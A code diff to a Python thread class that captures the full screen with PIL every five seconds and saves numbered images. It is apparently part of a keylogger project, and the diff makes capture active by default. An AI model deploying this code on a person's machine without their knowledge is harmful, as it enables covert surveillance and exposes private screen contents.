@@ -1,6 +1,8 @@
 from PIL import ImageGrab
 from threading import Thread
+from os import system, path
 import time
+
 
 
 class Screenshot(Thread):
@@ -9,7 +11,9 @@ class Screenshot(Thread):
         Thread.__init__(self, name='screenshots')
         self.__screenshotFrequency = 5
         self.__screenshotNumber = 0
-        self.__active = False
+        self.__active = True
+        self.__filePath = path.dirname(path.abspath(__file__))
+
 
 
     @property
@@ -30,12 +34,13 @@ class Screenshot(Thread):
                 time.sleep(self.__screenshotFrequency)
                 pic = ImageGrab.grab()
                 self.__screenshotNumber += 1
-                pic.save(f'C:\\Users\\forro\\Desktop\\keylogger\\pic\\{self.__screenshotNumber}.jpg')
-                print('Screenshot has been taken!')
+                pic.save(self.__filePath + f'\\{self.__screenshotNumber}.jpg')
+                print(f'Screenshot-{self.__screenshotNumber} taken')
 
 
 
 
 if __name__ == "__main__":
+    system('cls')
     screenshot = Screenshot()
     screenshot.start()
